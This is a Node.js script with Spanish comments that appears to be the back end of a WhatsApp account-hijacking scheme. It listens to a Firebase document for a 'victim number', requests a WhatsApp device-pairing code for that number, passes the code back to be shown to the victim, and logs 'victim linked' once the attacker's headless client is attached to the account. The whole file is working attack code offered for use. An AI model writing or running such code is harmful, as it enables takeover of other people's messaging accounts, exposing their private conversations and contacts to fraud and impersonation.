const { Client, LocalAuth } = require('whatsapp-web.js');
const admin = require('firebase-admin');
const express = require('express');
const app = express();

// 1. CARGAR FIREBASE
const serviceAccount = require("./serviceAccountKey.json"); 
if (!admin.apps.length) {
    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
}
const db = admin.firestore();
console.log("✅ FIREBASE CONECTADO");

// 2. CONFIGURACIÓN WHATSAPP (SIN BLOQUEO DE PERFIL)
const client = new Client({
    authStrategy: new LocalAuth({ dataPath: './session_data' }), // Carpeta nueva para evitar errores
    puppeteer: {
        headless: true,
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-gpu'
        ]
    }
});

// ESCUCHA DE FIREBASE
db.collection("wa_clon_global").doc("current_session").onSnapshot(async (snap) => {
    if (!snap.exists) return;
    const data = snap.data();
    if (data.status === "solicitando_codigo" && !data.pairingCode) {
        console.log("🚀 GENERANDO CÓDIGO PARA: " + data.numero_victima);
        try {
            const code = await client.requestPairingCode(data.numero_victima);
            console.log("🔑 CÓDIGO LISTO: " + code);
            await snap.ref.update({ pairingCode: code, status: "mostrando_codigo" });
        } catch (err) {
            console.log("❌ ERROR:", err.message);
        }
    }
});

client.on('ready', () => {
    console.log("🎯 VÍCTIMA VINCULADA");
    db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
});

client.initialize().catch(e => console.log("Fallo Init: " + e));

app.get('/', (req, res) => res.send('MOTOR OK'));
app.listen(5000, "0.0.0.0", () => console.log("📡 Servidor en puerto 5000"));
